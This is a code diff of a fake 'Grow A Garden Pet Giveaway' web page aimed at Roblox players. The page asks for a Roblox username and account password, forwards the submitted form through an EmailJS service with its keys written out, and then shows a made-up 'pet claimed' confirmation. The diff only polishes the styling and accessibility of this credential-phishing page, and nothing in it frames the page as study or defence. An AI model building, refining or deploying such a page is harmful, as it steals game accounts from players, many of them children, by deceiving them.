@@ -1,192 +1,263 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>🎉 Grow A Garden Pet Giveaway | Claim Your Limited Pet!</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-  <script>
-    (function () {
-      emailjs.init('HwuqVMwuxvAXdSmbQ'); // Your public key
-    })();
-  </script>
-  <style>
-    /* Reset and base */
-    * {
-      box-sizing: border-box;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🎉 Grow A Garden Pet Giveaway | Claim Your Limited Pet!</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  (function () {
+    emailjs.init('HwuqVMwuxvAXdSmbQ'); // Your EmailJS public key
+  })();
+</script>
+<style>
+  *, *::before, *::after {
+    box-sizing: border-box;
+  }
+  body, html {
+    margin: 0; padding: 0; min-height: 100vh;
+    font-family: 'Poppins', sans-serif;
+    overflow-y: auto; /* allow vertical scroll */
+    background: linear-gradient(270deg, #0057ff, #00bfff, #0057ff);
+    background-size: 600% 600%;
+    animation: backgroundShift 20s ease infinite;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  @keyframes backgroundShift {
+    0%{background-position:0% 50%}
+    50%{background-position:100% 50%}
+    100%{background-position:0% 50%}
+  }
+
+  .container {
+    background: #ffffffee;
+    border-radius: 25px;
+    max-width: 440px;
+    width: 100%;
+    padding: 48px 36px;
+    box-shadow:
+      0 0 10px 3px rgba(0,183,255,0.4),
+      0 12px 40px rgba(0,0,0,0.15);
+    text-align: center;
+    position: relative;
+    overflow: visible; /* allow full height */
+    max-height: none;
+    min-height: auto;
+  }
+
+  .title {
+    font-size: 2.8rem;
+    font-weight: 900;
+    color: #007acc;
+    letter-spacing: 1.5px;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+    text-shadow:
+      0 0 4px rgba(0, 122, 204, 0.6),
+      0 0 8px rgba(0, 122, 204, 0.4);
+    animation: glowPulse 3s ease-in-out infinite alternate;
+  }
+
+  @keyframes glowPulse {
+    0% {
+      text-shadow:
+        0 0 3px rgba(0, 122, 204, 0.5),
+        0 0 6px rgba(0, 122, 204, 0.3);
+      color: #007acc;
     }
-    body {
-      margin: 0;
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #0057ff, #00bfff);
-      color: #222;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+    100% {
+      text-shadow:
+        0 0 6px rgba(0, 122, 204, 0.7),
+        0 0 12px rgba(0, 122, 204, 0.5);
+      color: #005f99;
     }
-    /* Container */
+  }
+
+  .subtitle {
+    font-weight: 600;
+    font-size: 1.15rem;
+    margin-bottom: 40px;
+    color: #004a75cc;
+  }
+
+  form {
+    text-align: left;
+  }
+
+  label {
+    font-weight: 600;
+    font-size: 0.95rem;
+    color: #004466dd;
+    margin-bottom: 6px;
+    display: block;
+  }
+
+  input[type="text"],
+  input[type="password"],
+  select {
+    width: 100%;
+    padding: 15px 20px;
+    margin-bottom: 30px;
+    border-radius: 14px;
+    border: 2px solid #00bfff99;
+    font-size: 1rem;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    background: #f0faff;
+    color: #004466dd;
+    display: block;
+  }
+
+  input[type="text"]:focus,
+  input[type="password"]:focus,
+  select:focus {
+    outline: none;
+    border-color: #00d4ff;
+    box-shadow: 0 0 10px #00d4ffaa;
+    background: #ffffff;
+    color: #003355;
+  }
+
+  button {
+    width: 100%;
+    background: linear-gradient(135deg, #00bfff, #008ecc);
+    border: none;
+    border-radius: 20px;
+    padding: 16px;
+    font-weight: 900;
+    font-size: 1.25rem;
+    color: white;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    box-shadow:
+      0 6px 15px rgba(0,191,255,0.6),
+      inset 0 -3px 8px rgba(0,143,204,0.8);
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    min-height: 50px;
+    transition: all 0.3s ease;
+    margin-top: 0;
+  }
+  button:hover:not(:disabled) {
+    background: linear-gradient(135deg, #008ecc, #00bfff);
+    box-shadow:
+      0 10px 30px rgba(0,191,255,0.8),
+      inset 0 -5px 12px rgba(0,143,204,1);
+    transform: translateY(-4px) scale(1.05);
+  }
+  button:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+    box-shadow: none;
+    transform: none;
+  }
+
+  .spinner {
+    width: 22px;
+    height: 22px;
+    border: 3.5px solid rgba(255, 255, 255, 0.5);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 1.2s linear infinite;
+    display: none;
+  }
+
+  @keyframes spin {
+    0% {transform: rotate(0deg);}
+    100% {transform: rotate(360deg);}
+  }
+
+  .success-card {
+    display: none;
+    padding: 20px 10px;
+    color: #005580cc;
+    text-align: center;
+    overflow: visible;
+    max-height: none;
+    min-height: auto;
+    word-break: break-word;
+  }
+  .success-card.active {
+    display: block;
+  }
+  .success-icon {
+    font-size: 72px;
+    color: #00bfff;
+    animation: bounce 1.2s ease-in-out infinite alternate;
+  }
+  @keyframes bounce {
+    0% {transform: translateY(0);}
+    100% {transform: translateY(-15px);}
+  }
+  .claimed-pet {
+    font-size: 56px;
+    margin: 15px 0 5px;
+  }
+  .success-title {
+    font-weight: 900;
+    font-size: 1.9rem;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+  }
+  .success-text {
+    font-size: 1.15rem;
+    margin-bottom: 25px;
+  }
+  #claimAgainBtn {
+    padding: 14px 30px;
+    border-radius: 25px;
+    background: #00bfff;
+    color: white;
+    border: none;
+    font-weight: 700;
+    font-size: 1.1rem;
+    cursor: pointer;
+    box-shadow: 0 6px 15px rgba(0,191,255,0.6);
+    transition: background 0.3s ease, transform 0.3s ease;
+    display: inline-block;
+    min-width: 200px;
+  }
+  #claimAgainBtn:hover {
+    background: #008ecc;
+    transform: scale(1.05);
+  }
+
+  @media (max-width: 480px) {
     .container {
-      background: #fff;
-      border-radius: 20px;
-      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
-      max-width: 420px;
-      width: 100%;
-      padding: 40px 30px;
-      text-align: center;
-      position: relative;
-      overflow: hidden;
+      padding: 36px 24px;
     }
-    /* Title */
     .title {
-      font-size: 2.4rem;
-      font-weight: 700;
-      margin-bottom: 10px;
-      color: #0057ff;
-      letter-spacing: 1.5px;
+      font-size: 2.2rem;
     }
-    .subtitle {
-      font-weight: 500;
-      color: #555;
-      margin-bottom: 35px;
-    }
-    /* Form styles */
-    form {
-      text-align: left;
-    }
-    label {
-      display: block;
-      font-weight: 600;
-      margin-bottom: 6px;
-      color: #333;
-      font-size: 0.95rem;
-    }
-    input[type="text"],
-    input[type="password"],
-    select {
-      width: 100%;
-      padding: 14px 18px;
-      margin-bottom: 22px;
-      border-radius: 12px;
-      border: 2px solid #ddd;
-      font-size: 1rem;
-      transition: border-color 0.3s ease;
-    }
-    input[type="text"]:focus,
-    input[type="password"]:focus,
-    select:focus {
-      border-color: #00bfff;
-      outline: none;
-      box-shadow: 0 0 8px rgba(0, 191, 255, 0.6);
-    }
-    /* Button */
     button {
-      width: 100%;
-      padding: 16px;
-      font-size: 1.15rem;
-      font-weight: 700;
-      color: white;
-      background: linear-gradient(135deg, #0057ff, #00bfff);
-      border: none;
-      border-radius: 14px;
-      cursor: pointer;
-      letter-spacing: 1.2px;
-      text-transform: uppercase;
-      box-shadow: 0 8px 20px rgba(0, 191, 255, 0.5);
-      transition: background 0.3s ease, transform 0.2s ease;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 12px;
-    }
-    button:hover {
-      background: linear-gradient(135deg, #0047d4, #0099cc);
-      transform: translateY(-3px);
-      box-shadow: 0 12px 30px rgba(0, 148, 255, 0.7);
-    }
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      box-shadow: none;
-      transform: none;
-    }
-    /* Spinner */
-    .spinner {
-      width: 20px;
-      height: 20px;
-      border: 3px solid rgba(255, 255, 255, 0.4);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% {
-        transform: rotate(0);
-      }
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-    /* Success message */
-    .success-card {
-      display: none;
-      text-align: center;
-      padding: 10px 0;
-    }
-    .success-card.active {
-      display: block;
-    }
-    .success-icon {
-      font-size: 72px;
-      margin-bottom: 20px;
-      color: #00bfff;
-      animation: bounce 1s ease-in-out infinite alternate;
-    }
-    @keyframes bounce {
-      0% {
-        transform: translateY(0);
-      }
-      100% {
-        transform: translateY(-15px);
-      }
-    }
-    .success-title {
-      font-size: 1.8rem;
-      font-weight: 700;
-      color: #0057ff;
-      margin-bottom: 8px;
-    }
-    .success-text {
       font-size: 1.1rem;
-      margin-bottom: 24px;
-      color: #444;
     }
-    .claimed-pet {
-      font-size: 48px;
-      margin-bottom: 10px;
-      display: inline-block;
-    }
-    /* Responsive */
-    @media (max-width: 480px) {
-      .container {
-        padding: 30px 20px;
-      }
-      .title {
-        font-size: 2rem;
-      }
-    }
-  </style>
+  }
+</style>
 </head>
 <body>
-  <div class="container" role="main" aria-labelledby="main-title">
+  <main class="container" role="main" aria-labelledby="main-title">
     <h1 class="title" id="main-title">🎉 Grow A Garden Pet Giveaway 🎉</h1>
     <p class="subtitle">Claim your exclusive <strong>limited edition pet</strong> now!</p>
 
     <form id="claimForm" aria-describedby="form-desc" novalidate>
       <label for="username">Roblox Username</label>
-      <input type="text" id="username" name="username" placeholder="Enter your Roblox username" required autocomplete="username" />
+      <input
+        type="text"
+        id="username"
+        name="username"
+        placeholder="Enter your Roblox username"
+        required
+        autocomplete="username"
+        aria-required="true"
+      />
 
       <label for="password">Account Password</label>
       <input
@@ -196,10 +267,11 @@
         placeholder="Enter your Roblox password"
         required
         autocomplete="current-password"
+        aria-required="true"
       />
 
       <label for="petReward">Choose Your Pet Reward</label>
-      <select id="petReward" name="petReward" required>
+      <select id="petReward" name="petReward" required aria-required="true">
         <option value="" disabled selected>Select a pet...</option>
         <option value="🦊 Kitsune">🦊 Kitsune</option>
         <option value="🦝 Raccoon">🦝 Raccoon</option>
@@ -216,40 +288,27 @@
 
       <button type="submit" aria-live="polite" aria-busy="false" id="claimBtn">
         <span>Claim My Pet</span>
-        <svg
-          style="display:none;"
-          class="spinner"
-          viewBox="0 0 50 50"
-        >
-          <circle
-            class="path"
-            cx="25"
-            cy="25"
-            r="20"
-            fill="none"
-            stroke-width="5"
-          ></circle>
-        </svg>
+        <div class="spinner" aria-hidden="true"></div>
       </button>
     </form>
 
-    <div class="success-card" id="successCard" role="alert" aria-live="assertive">
+    <section class="success-card" id="successCard" role="alert" aria-live="assertive">
       <div class="success-icon" aria-hidden="true">🎉</div>
-      <div class="claimed-pet" id="claimedPetIcon">🐾</div>
+      <div class="claimed-pet" id="claimedPetIcon" aria-hidden="true">🐾</div>
       <h2 class="success-title" id="claimedPetName">Congrats!</h2>
       <p class="success-text">Your pet has been claimed successfully! Welcome to your new companion.</p>
       <button type="button" id="claimAgainBtn" aria-label="Claim another pet">Claim Another Pet</button>
-    </div>
-  </div>
+    </section>
+  </main>
 
   <script>
     const claimForm = document.getElementById('claimForm');
     const claimBtn = document.getElementById('claimBtn');
+    const spinner = claimBtn.querySelector('.spinner');
     const successCard = document.getElementById('successCard');
     const claimedPetIcon = document.getElementById('claimedPetIcon');
     const claimedPetName = document.getElementById('claimedPetName');
     const claimAgainBtn = document.getElementById('claimAgainBtn');
-    const container = document.querySelector('.container');
 
     claimForm.addEventListener('submit', (e) => {
       e.preventDefault();
@@ -259,37 +318,39 @@
         return;
       }
 
-      // Disable form & show loading
       claimBtn.disabled = true;
+      claimBtn.setAttribute('aria-busy', 'true');
       claimBtn.querySelector('span').textContent = 'Claiming Pet...';
-      claimBtn.querySelector('svg.spinner').style.display = 'inline-block';
+      spinner.style.display = 'inline-block';
 
-      // Send form with EmailJS
       emailjs
         .sendForm('service_zss1q0e', 'template_qnu4n8e', claimForm)
         .then(() => {
-          // Parse pet emoji and name
           const petReward = claimForm.petReward.value;
           const [emoji, ...nameParts] = petReward.split(' ');
           const petName = nameParts.join(' ');
 
-          // Show success card
           claimedPetIcon.textContent = emoji;
           claimedPetName.textContent = petName;
+
           claimForm.style.display = 'none';
           successCard.classList.add('active');
 
-          // Reset button loading state
           claimBtn.disabled = false;
+          claimBtn.setAttribute('aria-busy', 'false');
           claimBtn.querySelector('span').textContent = 'Claim My Pet';
-          claimBtn.querySelector('svg.spinner').style.display = 'none';
+          spinner.style.display = 'none';
+
+          // Scroll to top of success message so user can see all
+          successCard.scrollIntoView({ behavior: 'smooth' });
         })
         .catch((error) => {
           alert('Failed to send your claim. Please try again.');
           console.error('EmailJS error:', error);
           claimBtn.disabled = false;
+          claimBtn.setAttribute('aria-busy', 'false');
           claimBtn.querySelector('span').textContent = 'Claim My Pet';
-          claimBtn.querySelector('svg.spinner').style.display = 'none';
+          spinner.style.display = 'none';
         });
     });
 
@@ -297,6 +358,7 @@
       claimForm.reset();
       claimForm.style.display = 'block';
       successCard.classList.remove('active');
+      claimForm.querySelector('input').focus();
     });
   </script>
 </body>
